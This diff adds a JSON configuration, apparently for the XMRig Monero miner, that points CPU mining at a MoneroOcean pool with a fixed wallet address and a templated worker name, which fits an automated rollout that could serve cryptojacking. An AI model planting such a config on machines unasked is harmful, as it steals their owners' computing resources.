@@ -1,0 +1,26 @@
+{
+    "autosave": true,
+    "cpu": true,
+    "opencl": false,
+    "cuda": false,
+    "pools": [
+        {
+            "algo": null,
+            "coin": null,
+            "url": "gulf.moneroocean.stream:10256",
+            "user": "434KAd2GCm7RHNJSkgv7HyVNnLbLBnwnfXkfRtuAm61P7TKA5uKCMimRoTJncQaU1ocTkG98RrUZd2b7UsZUNzpK8yTNNe5",
+            "pass": "{{WORKER_NAME}}",
+            "rig-id": null,
+            "nicehash": false,
+            "keepalive": true,
+            "enabled": true,
+            "tls": false,
+            "sni": false,
+            "tls-fingerprint": null,
+            "daemon": false,
+            "socks5": null,
+            "self-select": null,
+            "submit-to-origin": false
+        }
+    ]
+}
